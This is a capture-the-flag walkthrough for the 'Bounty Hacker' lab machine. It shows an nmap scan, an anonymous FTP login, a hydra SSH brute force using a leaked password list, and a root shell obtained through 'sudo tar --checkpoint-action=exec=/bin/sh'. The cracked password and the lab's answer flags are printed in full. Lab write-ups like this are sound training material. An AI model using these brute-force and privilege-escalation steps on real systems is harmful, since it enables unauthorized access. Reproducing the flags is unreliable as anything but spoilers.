# Bounty Hacker
export IP=10.10.41.201
## 1 - Deploy the machine. 

## 2 - Find open ports on the machine 

cmd: nmap -sC -sV -oN nmap/initial $IP

```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.128.84
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

```

## 3 - Who wrote the task list?  

cmd: ftp $IP
Name: Anonymous
Password: < empty >

```
dir

-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
```

The tasks, at the bottom, says lin

### Answer: lin

## 4 - What service can you bruteforce with the text file found?

### Answer: ssh

## 5 - What is the users password? 

Lets use hydra<br>
cmd: hydra -l "lin" -P ./ftp_files/locks.txt -t 4 ssh://$IP:22

```
RESULTS:
[22][ssh] host: 10.10.41.201   login: lin   password: RedDr4gonSynd1cat3
```

### Answer: RedDr4gonSynd1cat3

## 5- user.txt

```
cat user.txt
THM{CR1M3_SyNd1C4T3}
```

### Answer: THM{CR1M3_SyNd1C4T3}

## 6 - root.txt

before launching an enumeration script for privesc, lets check sudo -l

```
sudo -l

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

Lets check gtfobins for tar!<br>
We got multiple ways, lets use this
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

whoami
root

cat /root/root.txt
THM{80UN7Y_h4cK3r}
```

### Answer: THM{80UN7Y_h4cK3r}